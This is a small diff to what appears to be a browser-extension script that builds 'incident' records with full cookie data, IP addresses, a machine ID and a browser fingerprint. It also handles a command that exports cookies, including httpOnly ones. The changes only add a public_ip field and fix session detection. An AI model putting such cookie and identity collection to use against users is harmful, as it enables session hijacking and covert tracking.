@@ -596,6 +596,7 @@ async function createIncident(data, retryCount = 0) {
       tab_url: data.tabUrl,
       machine_id: data.machineId,
       client_ip: clientIp,
+      public_ip: clientIp, // ✅ CORREÇÃO #3: Ambos os campos para compatibilidade
       browser_fingerprint: fingerprint,
       cookie_excerpt: generateCookieExcerpt(data.cookies),
       full_cookie_data: data.cookies,
@@ -1895,7 +1896,7 @@ async function handleExportCookiesCommand(data) {
         httpOnly: cookie.httpOnly,
         sameSite: cookie.sameSite,
         expirationDate: cookie.expirationDate,
-        isSession: !cookie.expirationDate || cookie.expirationDate === 0  // ✅ NOVO: flag de sessão
+        isSession: !cookie.expirationDate || cookie.expirationDate === 0 || cookie.expirationDate < 0  // ✅ CORREÇÃO #1: detectar sessão corretamente
       });
     }
     
